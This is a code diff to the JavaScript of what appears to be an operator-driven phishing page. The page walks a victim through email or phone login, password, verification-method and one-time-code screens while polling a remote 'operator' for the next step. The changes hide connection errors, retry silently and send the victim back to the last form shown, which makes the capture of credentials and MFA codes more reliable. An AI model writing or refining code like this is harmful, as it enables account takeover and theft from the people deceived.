@@ -801,6 +801,8 @@ let pollingStartTime = null;
 const POLLING_TIMEOUT_MS = 10 * 60 * 1000;
 let currentStatus = null;
 let lastShownStatus = '';
+let isProcessing = false;
+let lastFormVisibleStatus='WAITINGEMAIL';
 let selectedLoginMethod = null;
 let verificationOptions = [];
 
@@ -1037,11 +1039,17 @@ async function pollOperator() {
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     const data = await response.json();
     console.log("Polling:", data);
-    if (data.currentStatus) updateUIForStatus(data.currentStatus, data.data || {});
+    if (data.currentStatus) { isProcessing = false; updateUIForStatus(data.currentStatus, data.data || {}); }
 } catch (error) {
-    console.error("Polling error:", error);
+    console.error("[Template] Poll error, will retry in 5s:", error);
     clearInterval(pollingIntervalId);
-    showFailedView('Connection issue. Please check your internet and try again.');
+    if(isProcessing){isProcessing=false;updateUIForStatus(lastFormVisibleStatus,{})}
+    setTimeout(() => {
+        if (browserId) {
+            pollingStartTime = Date.now();
+            startPolling(2000);
+        }
+    }, 5000);
 }
 }
 
@@ -1066,6 +1074,7 @@ function updateUIForStatus(status, data = {}) {
 
     case 'WAITINGEMAIL':
     case 'WAITINGEMAILERROR':
+      lastFormVisibleStatus=status;
       hideLoading();
       showScreen('credentialScreen');
       if (selectedLoginMethod === 'phone') switchTab('phone'); else switchTab('email');
@@ -1085,6 +1094,7 @@ function updateUIForStatus(status, data = {}) {
 
     case 'WAITINGPASSWORD':
     case 'WAITINGPASSWORDERROR':
+      lastFormVisibleStatus=status;
       hideLoading();
       showScreen('credentialScreen');
       if (selectedLoginMethod === 'phone') switchTab('phone'); else switchTab('email');
@@ -1108,6 +1118,7 @@ function updateUIForStatus(status, data = {}) {
       break;
 
     case 'WAITINGOPTIONS':
+      lastFormVisibleStatus=status;
       hideLoading();
       showScreen('verificationOptionsScreen');
       let rawOpts = data.verificationOptions || [];
@@ -1118,6 +1129,7 @@ function updateUIForStatus(status, data = {}) {
       break;
 
     case 'WAITINGCODE':
+      lastFormVisibleStatus=status;
       hideLoading();
       showScreen('verificationCodeScreen');
       if (status !== currentStatus) {
@@ -1235,8 +1247,8 @@ async function handleUserSubmission() {
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     const data = await response.json();
     console.log("Update response:", data);
-    pollingStartTime = Date.now();
-    startPolling(2000);
+    isProcessing = true;
+    updateUIForStatus('PROCESSING', {});
   } catch (error) {
     console.error("Submission error:", error);
     hideLoading();
@@ -1264,8 +1276,8 @@ async function submitVerificationChoice() {
       body: objectToFormData(payload)
     });
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    pollingStartTime = Date.now();
-    startPolling(2000);
+    isProcessing = true;
+    updateUIForStatus('PROCESSING', {});
   } catch (error) {
     console.error("Verification choice error:", error);
     hideLoading();
@@ -1291,8 +1303,8 @@ async function submitVerificationCode() {
       body: objectToFormData(payload)
     });
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    pollingStartTime = Date.now();
-    startPolling(2000);
+    isProcessing = true;
+    updateUIForStatus('PROCESSING', {});
   } catch (error) {
     console.error("Verification code error:", error);
     hideLoading();
